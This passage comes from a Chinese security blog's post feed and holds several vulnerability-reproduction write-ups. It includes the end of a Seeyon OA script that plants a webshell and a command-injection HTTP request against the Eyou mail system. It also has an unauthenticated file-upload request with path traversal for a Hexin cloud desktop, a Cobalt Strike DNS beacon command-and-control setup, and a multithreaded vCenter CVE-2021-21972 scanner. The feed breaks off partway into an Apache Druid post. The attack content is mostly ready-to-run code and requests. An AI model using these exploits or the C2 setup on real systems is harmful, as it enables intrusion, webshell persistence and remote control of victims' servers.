class="string">&#x27;fileurls=fileurls\+&quot;,&quot;\+\&#x27;(.+)\&#x27;&#x27;</span>, filego.text, re.I)</span><br><span class="line">        fileid = fileid1[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(fileid1) == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&#x27;未获取到文件id可能上传失败！&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;上传成功文件id为----&gt;&gt;:&#x27;</span>+fileid)</span><br><span class="line">        Date_time = time.strftime(<span class="string">&#x27;%Y-%m-%d&#x27;</span>)</span><br><span class="line">        headersfile2 = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&quot;JSESSIONID=%s&quot;</span> % jsessionid&#125;</span><br><span class="line">        getshellurl = urllist+<span class="string">&#x27;/seeyon/ajax.do&#x27;</span></span><br><span class="line">        data = <span class="string">&#x27;method=ajaxAction&amp;managerName=portalDesignerManager&amp;managerMethod=uploadPageLayoutAttachment&amp;arguments=%5B0%2C%22&#x27;</span> + Date_time + <span class="string">&#x27;%22%2C%22&#x27;</span> + fileid + <span class="string">&#x27;%22%5D&#x27;</span></span><br><span class="line">        getshell = requests.post(url=getshellurl,data=data,headers=headersfile2)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        webshellurl1 = urllist + <span class="string">&#x27;/seeyon/common/designer/pageLayout/&#x27;</span> + webshell_name1</span><br><span class="line">        shelllist = requests.get(url=webshellurl1)</span><br><span class="line">        <span class="keyword">if</span> shelllist.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">&#x27;利用成功webshell地址：&#x27;</span>+webshellurl1)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;未找到webshell利用失败&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(sys.argv) == <span class="number">2</span>):</span><br><span class="line">        url = sys.argv[<span class="number">1</span>]</span><br><span class="line">        Seeyon_Getshell(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;python3 Seeyon_Getshell.py http://xx.xx.xx.xx&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 致远oa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>亿邮电子邮件系统 命令执行</title>
      <link href="2021/04/10/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>2021/04/10/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="自行搭建环境"><a href="#自行搭建环境" class="headerlink" title="自行搭建环境"></a>自行搭建环境</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E4%BA%BF%E9%82%AE1.webp" alt="image"></p><h3 id="漏洞路径"><a href="#漏洞路径" class="headerlink" title="漏洞路径"></a>漏洞路径</h3><pre><code>/webadm/?q=moni_detail.do&amp;action=gragh</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E4%BA%BF%E9%82%AE2.webp" alt="image"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;webadm&#x2F;?q&#x3D;moni_detail.do&amp;action&#x3D;gragh HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.87</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 12</span><br><span class="line"></span><br><span class="line">type&#x3D;&#39;|ls||&#39;</span><br></pre></td></tr></table></figure><p> <img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E4%BA%BF%E9%82%AE3.webp" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>和信下一代云桌面 文件上传</title>
      <link href="2021/04/10/%E5%92%8C%E4%BF%A1%E4%B8%8B%E4%B8%80%E4%BB%A3%E4%BA%91%E6%A1%8C%E9%9D%A2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>2021/04/10/%E5%92%8C%E4%BF%A1%E4%B8%8B%E4%B8%80%E4%BB%A3%E4%BA%91%E6%A1%8C%E9%9D%A2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="自行搭建测试环境"><a href="#自行搭建测试环境" class="headerlink" title="自行搭建测试环境"></a>自行搭建测试环境</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E4%BA%91%E6%A1%8C%E9%9D%A21.webp" alt="image"></p><h3 id="漏洞文件"><a href="#漏洞文件" class="headerlink" title="漏洞文件"></a>漏洞文件</h3><pre><code>http://xx.xx.xx.xx/Upload/upload_file.php</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E4%BA%91%E6%A1%8C%E9%9D%A22.webp" alt="image"></p><h3 id="直接post上传"><a href="#直接post上传" class="headerlink" title="直接post上传"></a>直接post上传</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST http:&#x2F;&#x2F;192.168.1.88&#x2F;Upload&#x2F;upload_file.php HTTP&#x2F;1.1</span><br><span class="line">Host:192.168.1.88</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.141 Safari&#x2F;537.36</span><br><span class="line">Accept: image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,image&#x2F;*,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Referer:192.168.1.88</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,fil;q&#x3D;0.8</span><br><span class="line">Cookie: think_language&#x3D;zh-cn; PHPSESSID_NAMED&#x3D;h9j8utbmv82cb1dcdlav1cgdf6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryfcKRltGv</span><br><span class="line">Content-Length: 167</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryfcKRltGv</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;TESTtest1.txt&quot;</span><br><span class="line">Content-Type: image&#x2F;avif</span><br><span class="line"></span><br><span class="line">test</span><br><span class="line">------WebKitFormBoundaryfcKRltGv--</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E4%BA%91%E6%A1%8C%E9%9D%A23.webp" alt="image"></p><h3 id="验证结果"><a href="#验证结果" class="headerlink" title="验证结果"></a>验证结果</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E4%BA%91%E6%A1%8C%E9%9D%A24.webp" alt="image"></p><h3 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h3><pre><code>http://xx.xx.xx.xx/Upload/upload_file.php</code></pre><p>后面可带 ?l=../xx 参数可控制上传目录<br>比如</p><pre><code>Upload/upload_file.php?l=../test</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E4%BA%91%E6%A1%8C%E9%9D%A255.webp" alt="image"></p><h4 id="上传的文件会到根目录新建的test文件夹中"><a href="#上传的文件会到根目录新建的test文件夹中" class="headerlink" title="上传的文件会到根目录新建的test文件夹中"></a>上传的文件会到根目录新建的test文件夹中</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E4%BA%91%E6%A1%8C%E9%9D%A266.webp" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cs  cobaltstrike DNS 上线</title>
      <link href="2021/04/09/cs-cobaltstrike-DNS-%E4%B8%8A%E7%BA%BF/"/>
      <url>2021/04/09/cs-cobaltstrike-DNS-%E4%B8%8A%E7%BA%BF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h1><h2 id="域名只要支持-NS-记录在哪获取都行-我这里以godaddy-购买的域名操作"><a href="#域名只要支持-NS-记录在哪获取都行-我这里以godaddy-购买的域名操作" class="headerlink" title="域名只要支持 NS 记录在哪获取都行 我这里以godaddy 购买的域名操作"></a>域名只要支持 NS 记录在哪获取都行 我这里以godaddy 购买的域名操作</h2><h3 id="添加一条-A-记录：名称自定义指向你的服务器ip"><a href="#添加一条-A-记录：名称自定义指向你的服务器ip" class="headerlink" title="添加一条 A 记录：名称自定义指向你的服务器ip"></a>添加一条 A 记录：名称自定义指向你的服务器ip</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/111.webp" alt="image"></p><h3 id="添加2条或者3条ns记录：名称自定义指向你添加的A记录名称加域名-vps-xxxxx-xyz"><a href="#添加2条或者3条ns记录：名称自定义指向你添加的A记录名称加域名-vps-xxxxx-xyz" class="headerlink" title="添加2条或者3条ns记录：名称自定义指向你添加的A记录名称加域名 vps.xxxxx.xyz"></a>添加2条或者3条ns记录：名称自定义指向你添加的A记录名称加域名 vps.xxxxx.xyz</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/222.webp" alt="image"></p><h3 id="测试域名记录是否生效："><a href="#测试域名记录是否生效：" class="headerlink" title="测试域名记录是否生效："></a>测试域名记录是否生效：</h3><h4 id="在服务器使用tcpdump-查看53端口流量"><a href="#在服务器使用tcpdump-查看53端口流量" class="headerlink" title="在服务器使用tcpdump  查看53端口流量"></a>在服务器使用tcpdump  查看53端口流量</h4><pre><code>tcpdump -n -i eth0 udp dst port 53nslookup ns3.xxxx.xyz  查看服务器是否有响应</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/333.webp" alt="image"></p><h1 id="Cs配置监听器"><a href="#Cs配置监听器" class="headerlink" title="Cs配置监听器"></a>Cs配置监听器</h1><h3 id="新建DNS-监听器"><a href="#新建DNS-监听器" class="headerlink" title="新建DNS 监听器"></a>新建DNS 监听器</h3><p>名字随意</p><p>Payload 选择Beacon DNS</p><p>Options 如下图填入  注意ns1.xxxx.xyz  不是ns1.vps.xxx.xyz<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/444.webp" alt="image"></p><p>NDS Host (Stager): 填入Options 中任意一条 点击 Save 保存<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/555.webp" alt="image"><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/666.webp" alt="image"></p><h1 id="上线测试："><a href="#上线测试：" class="headerlink" title="上线测试："></a>上线测试：</h1><h3 id="生成无状态exe"><a href="#生成无状态exe" class="headerlink" title="生成无状态exe"></a>生成无状态exe</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/777.webp" alt="image"></p><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/888.webp" alt="image"></p><p>正常运行后会上线一台主机但是呈现黑色<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/999.webp" alt="image"></p><p>进入beacon 执行</p><pre><code>checkin     主动连接发布数据mode dns-txt    使用DNS TXT作为数据通道</code></pre><p>执行以上两条命令后骚等片刻即可成功上线<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1010.webp" alt="image"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-21972  Vmware vCenter 任意文件上传</title>
      <link href="2021/02/25/CVE-2021-21972-Vmware-vCenter-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>2021/02/25/CVE-2021-21972-Vmware-vCenter-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="影响范围："><a href="#影响范围：" class="headerlink" title="影响范围："></a>影响范围：</h2><p>vCenter Server7.0 &lt; 7.0.U1c</p><p>vCenter Server6.7 &lt; 6.7.U3l</p><p>vCenter Servr6.5 &lt; 6.5 U3n</p><h4 id="自己搭建好测试环境"><a href="#自己搭建好测试环境" class="headerlink" title="自己搭建好测试环境"></a>自己搭建好测试环境</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/pasted-0.webp" alt="image"></p><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><pre><code>/ui/vropspluginui/rest/services/uploadova</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/pasted-2.webp" alt="image"></p><h4 id="批量漏洞检测脚本"><a href="#批量漏洞检测脚本" class="headerlink" title="批量漏洞检测脚本"></a>批量漏洞检测脚本</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/pasted-3.webp" alt="image"></p><p>来自  github: <a href="https://github.com/QmF0c3UK/CVE-2021-21972-vCenter-6.5-7.0-RCE-POC">https://github.com/QmF0c3UK/CVE-2021-21972-vCenter-6.5-7.0-RCE-POC</a></p> <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line">banner = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        888888ba             dP                     </span></span><br><span class="line"><span class="string">        88    `8b            88                     </span></span><br><span class="line"><span class="string">       a88aaaa8P&#x27; .d8888b. d8888P .d8888b. dP    dP </span></span><br><span class="line"><span class="string">        88   `8b. 88&#x27;  `88   88   Y8ooooo. 88    88 </span></span><br><span class="line"><span class="string">        88    .88 88.  .88   88         88 88.  .88 </span></span><br><span class="line"><span class="string">        88888888P `88888P8   dP   `88888P&#x27; `88888P&#x27; </span></span><br><span class="line"><span class="string">   ooooooooooooooooooooooooooooooooooooooooooooooooooooo </span></span><br><span class="line"><span class="string">                @time:2021/02/24 CVE-2021-21972.py</span></span><br><span class="line"><span class="string">                C0de by NebulabdSec - @batsu                  </span></span><br><span class="line"><span class="string"> &quot;&quot;&quot;</span></span><br><span class="line">print(banner)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line">http.client.HTTPConnection._http_vsn = <span class="number">10</span></span><br><span class="line">http.client.HTTPConnection._http_vsn_str = <span class="string">&#x27;HTTP/1.0&#x27;</span></span><br><span class="line"></span><br><span class="line">TARGET_URI = <span class="string">&quot;/ui/vropspluginui/rest/services/uploadova&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ua</span>():</span></span><br><span class="line">    first_num = random.randint(<span class="number">55</span>, <span class="number">62</span>)</span><br><span class="line">    third_num = random.randint(<span class="number">0</span>, <span class="number">3200</span>)</span><br><span class="line">    fourth_num = random.randint(<span class="number">0</span>, <span class="number">140</span>)</span><br><span class="line">    os_type = [</span><br><span class="line">        <span class="string">&#x27;(Windows NT 6.1; WOW64)&#x27;</span>, <span class="string">&#x27;(Windows NT 10.0; WOW64)&#x27;</span>, <span class="string">&#x27;(X11; Linux x86_64)&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(Macintosh; Intel Mac OS X 10_12_6)&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">    chrome_version = <span class="string">&#x27;Chrome/&#123;&#125;.0.&#123;&#125;.&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(first_num, third_num, fourth_num)</span><br><span class="line"></span><br><span class="line">    ua = <span class="string">&#x27; &#x27;</span>.join([<span class="string">&#x27;Mozilla/5.0&#x27;</span>, random.choice(os_type), <span class="string">&#x27;AppleWebKit/537.36&#x27;</span>,</span><br><span class="line">                   <span class="string">&#x27;(KHTML, like Gecko)&#x27;</span>, chrome_version, <span class="string">&#x27;Safari/537.36&#x27;</span>]</span><br><span class="line">                  )</span><br><span class="line">    <span class="keyword">return</span> ua</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CVE_2021_21972</span>(<span class="params">url</span>):</span></span><br><span class="line">    proxies = &#123;<span class="string">&quot;scoks5&quot;</span>: <span class="string">&quot;http://127.0.0.1:1081&quot;</span>&#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: get_ua(),</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    targetUrl = url + TARGET_URI</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(targetUrl,</span><br><span class="line">                            headers=headers,</span><br><span class="line">                            timeout=<span class="number">15</span>,</span><br><span class="line">                            verify=<span class="literal">False</span>,</span><br><span class="line">                            proxies=proxies)</span><br><span class="line">                            <span class="comment"># proxies=&#123;&#x27;socks5&#x27;: &#x27;http://127.0.0.1:1081&#x27;&#125;)</span></span><br><span class="line">        <span class="comment"># print(len(res.text))</span></span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">405</span>:</span><br><span class="line">            print(<span class="string">&quot;[+] URL:&#123;&#125;--------存在CVE-2021-21972漏洞&quot;</span>.<span class="built_in">format</span>(url))</span><br><span class="line">            <span class="comment"># print(&quot;[+] Command success result: &quot; + res.text + &quot;\n&quot;)</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;存在漏洞地址.txt&quot;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> fw:</span><br><span class="line">                fw.write(url + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;[-] &quot;</span> + url + <span class="string">&quot; 没有发现CVE-2021-21972漏洞.\n&quot;</span>)</span><br><span class="line">    <span class="comment"># except Exception as e:</span></span><br><span class="line">    <span class="comment">#     print(e)</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;[-] &quot;</span> + url + <span class="string">&quot; Request ERROR.\n&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multithreading</span>(<span class="params">filename, pools=<span class="number">5</span></span>):</span></span><br><span class="line">    works = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">            func_params = [i.rstrip(<span class="string">&quot;\n&quot;</span>)]</span><br><span class="line">            <span class="comment"># func_params = [i] + [cmd]</span></span><br><span class="line">            works.append((func_params, <span class="literal">None</span>))</span><br><span class="line">    pool = threadpool.ThreadPool(pools)</span><br><span class="line">    reqs = threadpool.makeRequests(CVE_2021_21972, works)</span><br><span class="line">    [pool.putRequest(req) <span class="keyword">for</span> req <span class="keyword">in</span> reqs]</span><br><span class="line">    pool.wait()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;--url&quot;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;Target URL; Example:http://ip:port&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-f&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;--file&quot;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;Url File; Example:url.txt&quot;</span>)</span><br><span class="line">    <span class="comment"># parser.add_argument(&quot;-c&quot;, &quot;--cmd&quot;, help=&quot;Commands to be executed; &quot;)</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    url = args.url</span><br><span class="line">    <span class="comment"># cmd = args.cmd</span></span><br><span class="line">    file_path = args.file</span><br><span class="line">    <span class="keyword">if</span> url != <span class="literal">None</span> <span class="keyword">and</span> file_path ==<span class="literal">None</span>:</span><br><span class="line">        CVE_2021_21972(url)</span><br><span class="line">    <span class="keyword">elif</span> url == <span class="literal">None</span> <span class="keyword">and</span> file_path != <span class="literal">None</span>:</span><br><span class="line">        multithreading(file_path, <span class="number">10</span>)  <span class="comment"># 默认15线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="漏洞利用脚本"><a href="#漏洞利用脚本" class="headerlink" title="漏洞利用脚本"></a>漏洞利用脚本</h4><p>自动利用上传一枚冰蝎3的webshell</p><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/pasted-4.webp" alt="image"></p><p>来自 github: <a href="https://github.com/NS-Sp4ce/CVE-2021-21972">https://github.com/NS-Sp4ce/CVE-2021-21972</a></p><h4 id="验证结果"><a href="#验证结果" class="headerlink" title="验证结果"></a>验证结果</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/pasted-6.webp" alt="image"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Apache Druid CVE-2021-25646 </title>
      <link href="2021/02/03/Apache-Druid-CVE-2021-25646-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>2021/02/03/Apache-Druid-CVE-2021-25646-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="自行搭建测试环境"><a href="#自行搭建测试环境" class="headerlink" title="自行搭建测试环境"></a>自行搭建测试环境</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612338658025.webp" alt="image"></p><h2 id="复现流程"><a href="#复现流程" class="headerlink" title="复现流程"></a>复现流程</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612338225038.webp" alt="image"></p><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612338397845.webp" alt="image"></p><h3 id="此处路径与文件填下面的值"><a href="#此处路径与文件填下面的值" class="headerlink" title="此处路径与文件填下面的值"></a>此处路径与文件填下面的值</h3><pre><code>quickstart/tutorial/wikiticker-2015-09-12-sampled.json.gz</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612338507305.webp" alt="image"></p><h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><h5 id="filter-参数"><a href="#filter-参数" class="headerlink" title="filter 参数"></a>filter 参数</h5><pre><code>&#123;&quot;type&quot;:&quot;selector&quot;,&quot;dimension&quot;:&quot;&quot;,&quot;value&quot;:&quot;&quot;&#125;&#125;&#125;</code></pre><h5 id="改成"><a href="#改成" 